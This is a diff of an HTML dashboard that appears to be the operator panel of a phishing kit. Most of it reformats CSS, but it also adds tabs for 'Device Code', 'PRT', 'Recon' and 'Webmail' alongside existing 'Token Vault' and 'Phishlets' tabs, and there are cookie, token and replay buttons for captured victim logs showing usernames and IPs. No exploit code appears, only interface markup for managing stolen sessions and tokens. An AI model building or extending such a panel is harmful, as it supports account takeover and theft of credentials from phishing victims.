@@ -9,14 +9,9 @@
     <!-- Chart.js -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
+        /* ── Global Styles ── */
         @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap');
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
             background: radial-gradient(circle at 20% 30%, #0a0e17, #030507);
@@ -25,7 +20,6 @@
             color: #e0e8f0;
             transition: background 0.4s ease, color 0.4s ease;
         }
-
         .glass {
             background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(16px) saturate(180%);
@@ -35,662 +29,121 @@
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6), inset 0 0 0 1px rgba(255, 255, 255, 0.03);
             transition: background 0.4s ease, border 0.4s ease, box-shadow 0.4s ease;
         }
-
-        .container {
-            max-width: 1440px;
-            margin: 0 auto;
-        }
-
-        body.light-glass {
-            background: radial-gradient(circle at 20% 30%, #e8edf5, #d0d8e5);
-            color: #1a1f2a;
-        }
-
-        body.light-glass .glass {
-            background: rgba(255, 255, 255, 0.25);
-            backdrop-filter: blur(20px) saturate(180%);
-            -webkit-backdrop-filter: blur(20px) saturate(180%);
-            border: 1px solid rgba(255, 255, 255, 0.35);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08), inset 0 0 0 1px rgba(255, 255, 255, 0.2);
-        }
-
-        body.light-glass .header h1 {
-            background: linear-gradient(135deg, #4a2c8a, #2a5f8a);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        body.light-glass .stat-card .value {
-            background: linear-gradient(135deg, #1a1f2a, #3a4f6a);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        body.light-glass .stat-card label,
-        body.light-glass .stat-card .sub {
-            color: rgba(0, 0, 0, 0.6);
-        }
-
-        body.light-glass .badge {
-            background: rgba(0, 0, 0, 0.08);
-            color: #1a1f2a;
-            border-color: rgba(0, 0, 0, 0.1);
-        }
-
-        body.light-glass .action-btn {
-            color: #1a1f2a;
-            border-color: rgba(0, 0, 0, 0.15);
-        }
-        body.light-glass .action-btn:hover {
-            background: rgba(0, 0, 0, 0.06);
-        }
-
-        body.light-glass .action-btn.cookie {
-            border-color: rgba(200, 150, 0, 0.3);
-            color: #b8860b;
-        }
-
-        body.light-glass .toolbar input,
-        body.light-glass .toolbar select {
-            background: rgba(255, 255, 255, 0.3);
-            border-color: rgba(0, 0, 0, 0.1);
-            color: #1a1f2a;
-        }
-        body.light-glass .toolbar input::placeholder {
-            color: rgba(0, 0, 0, 0.4);
-        }
-        body.light-glass .toolbar input:focus,
-        body.light-glass .toolbar select:focus {
-            border-color: #7c4dff;
-            box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2);
-        }
-        body.light-glass .toolbar select option {
-            background: #f0f4ff;
-            color: #1a1f2a;
-        }
-
-        body.light-glass .btn {
-            color: #1a1f2a;
-            border-color: rgba(0, 0, 0, 0.1);
-            background: rgba(255, 255, 255, 0.2);
-        }
-        body.light-glass .btn:hover {
-            background: rgba(255, 255, 255, 0.4);
-        }
-        body.light-glass .btn-primary {
-            background: linear-gradient(135deg, #536dfe, #7c4dff);
-            color: #fff;
-            border-color: transparent;
-        }
-        body.light-glass .btn-primary:hover {
-            background: linear-gradient(135deg, #6a7ffc, #9464ff);
-        }
-
-        body.light-glass .modal-content {
-            background: rgba(255, 255, 255, 0.3);
-            backdrop-filter: blur(20px);
-            border-color: rgba(255, 255, 255, 0.4);
-        }
-        body.light-glass .modal pre {
-            background: rgba(0, 0, 0, 0.05);
-            border-color: rgba(0, 0, 0, 0.1);
-        }
-
-        body.light-glass .toast {
-            background: rgba(255, 255, 255, 0.9);
-            color: #1a1f2a;
-            border-color: rgba(0, 0, 0, 0.1);
-        }
-
-        body.light-glass .ws-dot.online {
-            background: #2b8c3e;
-            box-shadow: 0 0 12px #2b8c3e;
-        }
-        body.light-glass .ws-dot.offline {
-            background: #c92a2a;
-            box-shadow: 0 0 12px #c92a2a;
-        }
-
-        /* ----- Tabs ----- */
-        .tabs {
-            display: flex;
-            gap: 4px;
-            padding: 4px;
-            margin-bottom: 24px;
-            overflow-x: auto;
-        }
-        .tab {
-            padding: 10px 24px;
-            border-radius: 40px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            transition: all 0.2s;
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.05);
-            color: rgba(255,255,255,0.5);
-            white-space: nowrap;
-        }
-        .tab:hover {
-            background: rgba(255,255,255,0.06);
-            color: rgba(255,255,255,0.8);
-        }
-        .tab.active {
-            background: rgba(124,77,255,0.2);
-            border-color: rgba(124,77,255,0.3);
-            color: #b388ff;
-        }
-        body.light-glass .tab {
-            color: rgba(0,0,0,0.4);
-            background: rgba(0,0,0,0.02);
-            border-color: rgba(0,0,0,0.05);
-        }
-        body.light-glass .tab:hover {
-            color: rgba(0,0,0,0.7);
-        }
-        body.light-glass .tab.active {
-            background: rgba(124,77,255,0.15);
-            border-color: rgba(124,77,255,0.2);
-            color: #4a2c8a;
-        }
-
-        .tab-content {
-            display: none;
-        }
-        .tab-content.active {
-            display: block;
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 16px;
-            padding: 20px 28px;
-            margin-bottom: 28px;
-        }
-
-        .header h1 {
-            font-weight: 700;
-            font-size: 26px;
-            background: linear-gradient(135deg, #b388ff, #82b1ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: -0.5px;
-        }
-
-        .header-actions {
-            display: flex;
-            gap: 12px;
-            align-items: center;
-        }
-
-        .btn {
-            background: rgba(255, 255, 255, 0.06);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            color: #e0e8f0;
-            padding: 8px 18px;
-            border-radius: 40px;
-            font-weight: 500;
-            font-size: 13px;
-            cursor: pointer;
-            transition: all 0.2s;
-            backdrop-filter: blur(4px);
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .btn:hover {
-            background: rgba(255, 255, 255, 0.14);
-            border-color: rgba(255, 255, 255, 0.25);
-            box-shadow: 0 0 20px rgba(130, 177, 255, 0.15);
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, #536dfe, #7c4dff);
-            border-color: transparent;
-            color: #fff;
-            box-shadow: 0 4px 15px rgba(83, 109, 254, 0.3);
-        }
-
-        .btn-primary:hover {
-            background: linear-gradient(135deg, #6a7ffc, #9464ff);
-            box-shadow: 0 4px 25px rgba(83, 109, 254, 0.5);
-            border-color: transparent;
-        }
-
-        .btn-success {
-            background: linear-gradient(135deg, #00c853, #00e676);
-            border-color: transparent;
-            color: #fff;
-        }
-        .btn-success:hover {
-            background: linear-gradient(135deg, #00e676, #69f0ae);
-        }
-        .btn-danger {
-            background: linear-gradient(135deg, #d50000, #ff1744);
-            border-color: transparent;
-            color: #fff;
-        }
-        .btn-danger:hover {
-            background: linear-gradient(135deg, #ff1744, #ff5252);
-        }
-        .btn-warning {
-            background: linear-gradient(135deg, #ff6d00, #ff9100);
-            border-color: transparent;
-            color: #fff;
-        }
-        .btn-warning:hover {
-            background: linear-gradient(135deg, #ff9100, #ffab40);
-        }
-        .btn-sm {
-            padding: 4px 12px;
-            font-size: 11px;
-            border-radius: 30px;
-        }
-
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 16px;
-            margin-bottom: 28px;
-        }
-
-        .stat-card {
-            padding: 18px 22px;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .stat-card label {
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            color: rgba(255, 255, 255, 0.5);
-            margin-bottom: 4px;
-        }
-
-        .stat-card .value {
-            font-size: 32px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #f0f4ff, #b0c4ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .stat-card .sub {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.5);
-            margin-top: 4px;
-        }
-
-        .toolbar {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            align-items: center;
-            padding: 16px 24px;
-            margin-bottom: 24px;
-        }
-
-        .toolbar input,
-        .toolbar select {
-            background: rgba(255, 255, 255, 0.06);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 40px;
-            padding: 8px 18px;
-            color: #e0e8f0;
-            font-size: 13px;
-            outline: none;
-            transition: 0.2s;
-            backdrop-filter: blur(4px);
-        }
-
-        .toolbar input:focus,
-        .toolbar select:focus {
-            border-color: #7c4dff;
-            box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2);
-        }
-
-        .toolbar input::placeholder {
-            color: rgba(255, 255, 255, 0.3);
-        }
-
-        .toolbar select option {
-            background: #1a1f2a;
-            color: #e0e8f0;
-        }
-
-        .ws-status {
-            margin-left: auto;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .ws-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
-        }
-
-        .ws-dot.online {
-            background: #69db7c;
-            box-shadow: 0 0 12px #69db7c;
-        }
-
-        .ws-dot.offline {
-            background: #ff6b6b;
-            box-shadow: 0 0 12px #ff6b6b;
-        }
-
-        .table-wrap {
-            overflow-x: auto;
-            padding: 4px;
-            margin-bottom: 24px;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 14px;
-        }
-
-        th {
-            text-align: left;
-            padding: 14px 16px;
-            font-weight: 600;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            color: rgba(255, 255, 255, 0.4);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        td {
-            padding: 14px 16px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-            color: rgba(255, 255, 255, 0.8);
-        }
-
-        tr:hover td {
-            background: rgba(255, 255, 255, 0.04);
-        }
-
-        .badge {
-            background: rgba(130, 177, 255, 0.15);
-            padding: 2px 12px;
-            border-radius: 40px;
-            font-size: 12px;
-            color: #82b1ff;
-            border: 1px solid rgba(130, 177, 255, 0.1);
-            display: inline-block;
-        }
-
-        .badge-success {
-            background: rgba(0, 200, 83, 0.15);
-            color: #69db7c;
-            border-color: rgba(0, 200, 83, 0.2);
-        }
-        .badge-danger {
-            background: rgba(255, 23, 68, 0.15);
-            color: #ff6b6b;
-            border-color: rgba(255, 23, 68, 0.2);
-        }
-        .badge-warning {
-            background: rgba(255, 109, 0, 0.15);
-            color: #ffab40;
-            border-color: rgba(255, 109, 0, 0.2);
-        }
-        .badge-info {
-            background: rgba(33, 150, 243, 0.15);
-            color: #64b5f6;
-            border-color: rgba(33, 150, 243, 0.2);
-        }
-
-        .action-btn {
-            background: transparent;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: #e0e8f0;
-            padding: 4px 12px;
-            border-radius: 30px;
-            font-size: 12px;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-right: 6px;
-        }
-
-        .action-btn:hover {
-            background: rgba(255, 255, 255, 0.08);
-            border-color: rgba(255, 255, 255, 0.2);
-        }
-
-        .action-btn.cookie {
-            border-color: rgba(255, 215, 0, 0.2);
-            color: #ffd700;
-        }
-        .action-btn.cookie:hover {
-            background: rgba(255, 215, 0, 0.08);
-            border-color: #ffd700;
-        }
-        .action-btn.replay:hover {
-            background: rgba(0, 255, 200, 0.1);
-            border-color: #00ffc8;
-            box-shadow: 0 0 20px rgba(0, 255, 200, 0.2);
-        }
-        .action-btn.token {
-            border-color: rgba(255, 215, 0, 0.2);
-            color: #ffd700;
-        }
-        .action-btn.token:hover {
-            background: rgba(255, 215, 0, 0.08);
-            border-color: #ffd700;
-        }
-
-        .grid-2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 24px;
-            margin-bottom: 24px;
-        }
-
-        .map-container {
-            height: 300px;
-            border-radius: 20px;
-            overflow: hidden;
-            background: rgba(0, 0, 0, 0.3);
-        }
-
-        #map {
-            height: 100%;
-            width: 100%;
-            background: transparent;
-        }
-
-        .chart-container {
-            height: 300px;
-            padding: 16px;
-        }
-
-        .chart-container canvas {
-            width: 100% !important;
-            height: 100% !important;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(12px);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            max-width: 800px;
-            width: 90%;
-            max-height: 80vh;
-            padding: 28px;
-            overflow-y: auto;
-            position: relative;
-        }
-
-        .modal-close {
-            position: sticky;
-            top: 0;
-            float: right;
-            background: rgba(255, 107, 107, 0.15);
-            border: 1px solid rgba(255, 107, 107, 0.2);
-            color: #ff6b6b;
-            padding: 6px 16px;
-            border-radius: 40px;
-            cursor: pointer;
-            font-weight: 500;
-            transition: 0.2s;
-        }
-
-        .modal-close:hover {
-            background: rgba(255, 107, 107, 0.25);
-        }
-
-        .modal pre {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 16px;
-            border-radius: 12px;
-            overflow-x: auto;
-            font-size: 12px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .toast {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: #e0e8f0;
-            padding: 14px 24px;
-            border-radius: 40px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
-            z-index: 3000;
-            animation: slideUp 0.3s ease;
-        }
-
-        .toast.error {
-            border-color: rgba(255, 107, 107, 0.3);
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @media (max-width: 768px) {
-            .grid-2 {
-                grid-template-columns: 1fr;
-            }
-            .header {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .toolbar {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .ws-status {
-                margin-left: 0;
-                justify-content: flex-end;
-            }
-            .tabs {
-                gap: 2px;
-            }
-            .tab {
-                padding: 6px 14px;
-                font-size: 12px;
-            }
-        }
-
-        .leaflet-control-zoom a {
-            background: rgba(255, 255, 255, 0.08) !important;
-            color: #e0e8f0 !important;
-            border-color: rgba(255, 255, 255, 0.1) !important;
-        }
-
-        .leaflet-popup-content-wrapper {
-            background: rgba(20, 25, 35, 0.9) !important;
-            backdrop-filter: blur(12px) !important;
-            color: #e0e8f0 !important;
-            border: 1px solid rgba(255, 255, 255, 0.05) !important;
-        }
-
-        body.light-glass .leaflet-control-zoom a {
-            background: rgba(255, 255, 255, 0.3) !important;
-            color: #1a1f2a !important;
-            border-color: rgba(0, 0, 0, 0.1) !important;
-        }
-        body.light-glass .leaflet-popup-content-wrapper {
-            background: rgba(255, 255, 255, 0.9) !important;
-            color: #1a1f2a !important;
-            border-color: rgba(0, 0, 0, 0.1) !important;
-        }
-
-        /* Toggle switch for phishlets */
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 44px;
-            height: 24px;
-        }
-        .switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(255,255,255,0.1);
-            transition: .3s;
-            border-radius: 34px;
-        }
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 18px;
-            width: 18px;
-            left: 3px;
-            bottom: 3px;
-            background-color: rgba(255,255,255,0.3);
-            transition: .3s;
-            border-radius: 50%;
-        }
-        input:checked + .slider {
-            background-color: #7c4dff;
-        }
-        input:checked + .slider:before {
-            transform: translateX(20px);
-            background-color: white;
-        }
+        .container { max-width: 1440px; margin: 0 auto; }
+        body.light-glass { background: radial-gradient(circle at 20% 30%, #e8edf5, #d0d8e5); color: #1a1f2a; }
+        body.light-glass .glass { background: rgba(255, 255, 255, 0.25); backdrop-filter: blur(20px) saturate(180%); border: 1px solid rgba(255, 255, 255, 0.35); box-shadow: 0 8px 32px rgba(0,0,0,0.08), inset 0 0 0 1px rgba(255,255,255,0.2); }
+        body.light-glass .header h1 { background: linear-gradient(135deg, #4a2c8a, #2a5f8a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        body.light-glass .stat-card .value { background: linear-gradient(135deg, #1a1f2a, #3a4f6a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        body.light-glass .stat-card label, body.light-glass .stat-card .sub { color: rgba(0,0,0,0.6); }
+        body.light-glass .badge { background: rgba(0,0,0,0.08); color: #1a1f2a; border-color: rgba(0,0,0,0.1); }
+        body.light-glass .action-btn { color: #1a1f2a; border-color: rgba(0,0,0,0.15); }
+        body.light-glass .action-btn:hover { background: rgba(0,0,0,0.06); }
+        body.light-glass .toolbar input, body.light-glass .toolbar select { background: rgba(255,255,255,0.3); border-color: rgba(0,0,0,0.1); color: #1a1f2a; }
+        body.light-glass .toolbar input::placeholder { color: rgba(0,0,0,0.4); }
+        body.light-glass .toolbar input:focus, body.light-glass .toolbar select:focus { border-color: #7c4dff; box-shadow: 0 0 0 3px rgba(124,77,255,0.2); }
+        body.light-glass .btn { color: #1a1f2a; border-color: rgba(0,0,0,0.1); background: rgba(255,255,255,0.2); }
+        body.light-glass .btn:hover { background: rgba(255,255,255,0.4); }
+        body.light-glass .btn-primary { background: linear-gradient(135deg, #536dfe, #7c4dff); color: #fff; border-color: transparent; }
+        body.light-glass .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); }
+        body.light-glass .modal-content { background: rgba(255,255,255,0.3); backdrop-filter: blur(20px); border-color: rgba(255,255,255,0.4); }
+        body.light-glass .modal pre { background: rgba(0,0,0,0.05); border-color: rgba(0,0,0,0.1); }
+        body.light-glass .toast { background: rgba(255,255,255,0.9); color: #1a1f2a; border-color: rgba(0,0,0,0.1); }
+        body.light-glass .ws-dot.online { background: #2b8c3e; box-shadow: 0 0 12px #2b8c3e; }
+        body.light-glass .ws-dot.offline { background: #c92a2a; box-shadow: 0 0 12px #c92a2a; }
+
+        .tabs { display: flex; gap: 4px; padding: 4px; margin-bottom: 24px; overflow-x: auto; }
+        .tab { padding: 10px 24px; border-radius: 40px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); color: rgba(255,255,255,0.5); white-space: nowrap; }
+        .tab:hover { background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.8); }
+        .tab.active { background: rgba(124,77,255,0.2); border-color: rgba(124,77,255,0.3); color: #b388ff; }
+        body.light-glass .tab { color: rgba(0,0,0,0.4); background: rgba(0,0,0,0.02); border-color: rgba(0,0,0,0.05); }
+        body.light-glass .tab:hover { color: rgba(0,0,0,0.7); }
+        body.light-glass .tab.active { background: rgba(124,77,255,0.15); border-color: rgba(124,77,255,0.2); color: #4a2c8a; }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; padding: 20px 28px; margin-bottom: 28px; }
+        .header h1 { font-weight: 700; font-size: 26px; background: linear-gradient(135deg, #b388ff, #82b1ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; letter-spacing: -0.5px; }
+        .header-actions { display: flex; gap: 12px; align-items: center; }
+
+        .btn { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.12); color: #e0e8f0; padding: 8px 18px; border-radius: 40px; font-weight: 500; font-size: 13px; cursor: pointer; transition: all 0.2s; backdrop-filter: blur(4px); display: inline-flex; align-items: center; gap: 6px; }
+        .btn:hover { background: rgba(255,255,255,0.14); border-color: rgba(255,255,255,0.25); box-shadow: 0 0 20px rgba(130,177,255,0.15); }
+        .btn-primary { background: linear-gradient(135deg, #536dfe, #7c4dff); border-color: transparent; color: #fff; box-shadow: 0 4px 15px rgba(83,109,254,0.3); }
+        .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); box-shadow: 0 4px 25px rgba(83,109,254,0.5); border-color: transparent; }
+        .btn-success { background: linear-gradient(135deg, #00c853, #00e676); border-color: transparent; color: #fff; }
+        .btn-success:hover { background: linear-gradient(135deg, #00e676, #69f0ae); }
+        .btn-danger { background: linear-gradient(135deg, #d50000, #ff1744); border-color: transparent; color: #fff; }
+        .btn-danger:hover { background: linear-gradient(135deg, #ff1744, #ff5252); }
+        .btn-warning { background: linear-gradient(135deg, #ff6d00, #ff9100); border-color: transparent; color: #fff; }
+        .btn-warning:hover { background: linear-gradient(135deg, #ff9100, #ffab40); }
+        .btn-sm { padding: 4px 12px; font-size: 11px; border-radius: 30px; }
+
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; margin-bottom: 28px; }
+        .stat-card { padding: 18px 22px; display: flex; flex-direction: column; }
+        .stat-card label { font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; color: rgba(255,255,255,0.5); margin-bottom: 4px; }
+        .stat-card .value { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, #f0f4ff, #b0c4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .stat-card .sub { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 4px; }
+
+        .toolbar { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; padding: 16px 24px; margin-bottom: 24px; }
+        .toolbar input, .toolbar select { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 40px; padding: 8px 18px; color: #e0e8f0; font-size: 13px; outline: none; transition: 0.2s; backdrop-filter: blur(4px); }
+        .toolbar input:focus, .toolbar select:focus { border-color: #7c4dff; box-shadow: 0 0 0 3px rgba(124,77,255,0.2); }
+        .toolbar input::placeholder { color: rgba(255,255,255,0.3); }
+        .toolbar select option { background: #1a1f2a; color: #e0e8f0; }
+
+        .ws-status { margin-left: auto; font-size: 13px; display: flex; align-items: center; gap: 6px; }
+        .ws-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
+        .ws-dot.online { background: #69db7c; box-shadow: 0 0 12px #69db7c; }
+        .ws-dot.offline { background: #ff6b6b; box-shadow: 0 0 12px #ff6b6b; }
+
+        .table-wrap { overflow-x: auto; padding: 4px; margin-bottom: 24px; }
+        table { width: 100%; border-collapse: collapse; font-size: 14px; }
+        th { text-align: left; padding: 14px 16px; font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.05em; color: rgba(255,255,255,0.4); border-bottom: 1px solid rgba(255,255,255,0.06); }
+        td { padding: 14px 16px; border-bottom: 1px solid rgba(255,255,255,0.04); color: rgba(255,255,255,0.8); }
+        tr:hover td { background: rgba(255,255,255,0.04); }
+
+        .badge { background: rgba(130,177,255,0.15); padding: 2px 12px; border-radius: 40px; font-size: 12px; color: #82b1ff; border: 1px solid rgba(130,177,255,0.1); display: inline-block; }
+        .badge-success { background: rgba(0,200,83,0.15); color: #69db7c; border-color: rgba(0,200,83,0.2); }
+        .badge-danger { background: rgba(255,23,68,0.15); color: #ff6b6b; border-color: rgba(255,23,68,0.2); }
+        .badge-warning { background: rgba(255,109,0,0.15); color: #ffab40; border-color: rgba(255,109,0,0.2); }
+        .badge-info { background: rgba(33,150,243,0.15); color: #64b5f6; border-color: rgba(33,150,243,0.2); }
+
+        .action-btn { background: transparent; border: 1px solid rgba(255,255,255,0.1); color: #e0e8f0; padding: 4px 12px; border-radius: 30px; font-size: 12px; cursor: pointer; transition: 0.2s; margin-right: 6px; }
+        .action-btn:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.2); }
+        .action-btn.cookie { border-color: rgba(255,215,0,0.2); color: #ffd700; }
+        .action-btn.cookie:hover { background: rgba(255,215,0,0.08); border-color: #ffd700; }
+        .action-btn.replay { border-color: rgba(0,255,200,0.3); color: #00ffc8; }
+        .action-btn.replay:hover { background: rgba(0,255,200,0.1); border-color: #00ffc8; box-shadow: 0 0 20px rgba(0,255,200,0.2); }
+        .action-btn.token { border-color: rgba(255,215,0,0.2); color: #ffd700; }
+        .action-btn.token:hover { background: rgba(255,215,0,0.08); border-color: #ffd700; }
+
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
+        .map-container { height: 300px; border-radius: 20px; overflow: hidden; background: rgba(0,0,0,0.3); }
+        #map { height: 100%; width: 100%; background: transparent; }
+        .chart-container { height: 300px; padding: 16px; }
+        .chart-container canvas { width: 100% !important; height: 100% !important; }
+
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(12px); z-index: 2000; justify-content: center; align-items: center; }
+        .modal-content { max-width: 800px; width: 90%; max-height: 80vh; padding: 28px; overflow-y: auto; position: relative; }
+        .modal-close { position: sticky; top: 0; float: right; background: rgba(255,107,107,0.15); border: 1px solid rgba(255,107,107,0.2); color: #ff6b6b; padding: 6px 16px; border-radius: 40px; cursor: pointer; font-weight: 500; transition: 0.2s; }
+        .modal-close:hover { background: rgba(255,107,107,0.25); }
+        .modal pre { background: rgba(0,0,0,0.3); padding: 16px; border-radius: 12px; overflow-x: auto; font-size: 12px; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgba(255,255,255,0.05); }
+
+        .toast { position: fixed; bottom: 24px; right: 24px; background: rgba(0,0,0,0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); color: #e0e8f0; padding: 14px 24px; border-radius: 40px; box-shadow: 0 8px 32px rgba(0,0,0,0.6); z-index: 3000; animation: slideUp 0.3s ease; }
+        .toast.error { border-color: rgba(255,107,107,0.3); }
+        @keyframes slideUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+
+        .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
+        .switch input { opacity:0; width:0; height:0; }
+        .slider { position: absolute; cursor: pointer; top:0; left:0; right:0; bottom:0; background-color:rgba(255,255,255,0.1); transition:.3s; border-radius:34px; }
+        .slider:before { position: absolute; content:""; height:18px; width:18px; left:3px; bottom:3px; background-color:rgba(255,255,255,0.3); transition:.3s; border-radius:50%; }
+        input:checked + .slider { background-color:#7c4dff; }
+        input:checked + .slider:before { transform:translateX(20px); background-color:white; }
+
+        @media (max-width:768px) { .grid-2 { grid-template-columns:1fr; } .header { flex-direction:column; align-items:stretch; } .toolbar { flex-direction:column; align-items:stretch; } .ws-status { margin-left:0; justify-content:flex-end; } .tabs { gap:2px; } .tab { padding:6px 14px; font-size:12px; } }
+        .leaflet-control-zoom a { background:rgba(255,255,255,0.08) !important; color:#e0e8f0 !important; border-color:rgba(255,255,255,0.1) !important; }
+        .leaflet-popup-content-wrapper { background:rgba(20,25,35,0.9) !important; backdrop-filter:blur(12px) !important; color:#e0e8f0 !important; border:1px solid rgba(255,255,255,0.05) !important; }
+        body.light-glass .leaflet-control-zoom a { background:rgba(255,255,255,0.3) !important; color:#1a1f2a !important; border-color:rgba(0,0,0,0.1) !important; }
+        body.light-glass .leaflet-popup-content-wrapper { background:rgba(255,255,255,0.9) !important; color:#1a1f2a !important; border-color:rgba(0,0,0,0.1) !important; }
     </style>
 </head>
 <body>
@@ -746,6 +199,10 @@
         <div class="tab" data-tab="vault" onclick="switchTab('vault')">🏛️ Token Vault</div>
         <div class="tab" data-tab="analytics" onclick="switchTab('analytics')">📈 Analytics</div>
         <div class="tab" data-tab="phishlets" onclick="switchTab('phishlets')">🎭 Phishlets</div>
+        <div class="tab" data-tab="device" onclick="switchTab('device')">📱 Device Code</div>
+        <div class="tab" data-tab="prt" onclick="switchTab('prt')">🔐 PRT</div>
+        <div class="tab" data-tab="recon" onclick="switchTab('recon')">🔍 Recon</div>
+        <div class="tab" data-tab="webmail" onclick="switchTab('webmail')">📧 Webmail</div>
     </div>
 
     <!-- ==================== TAB: Dashboard ==================== -->
@@ -764,17 +221,17 @@
             </div>
         </div>
 
-        <div class="table-wrap glass" style="padding: 8px;">
+        <div class="table-wrap glass" style="padding:8px;">
             <table>
                 <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Username</th><th>IP</th><th>Actions</th></tr></thead>
                 <tbody id="logTable"></tbody>
             </table>
         </div>
 
-        <div class="table-wrap glass" style="padding: 8px; margin-top: 20px;">
-            <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px 16px;">
-                <h3 style="color: rgba(255,255,255,0.6); font-weight: 400;">📊 Recent Visits</h3>
-                <span style="font-size: 12px; color: rgba(255,255,255,0.3);">Live updates</span>
+        <div class="table-wrap glass" style="padding:8px; margin-top:20px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; padding:12px 16px;">
+                <h3 style="color:rgba(255,255,255,0.6); font-weight:400;">📊 Recent Visits</h3>
+                <span style="font-size:12px; color:rgba(255,255,255,0.3);">Live updates</span>
             </div>
             <table>
                 <thead><tr><th>Time</th><th>🌍 Country</th><th>IP</th><th>User-Agent</th><th>Referer</th><th>URL</th></tr></thead>
@@ -785,12 +242,8 @@
         </div>
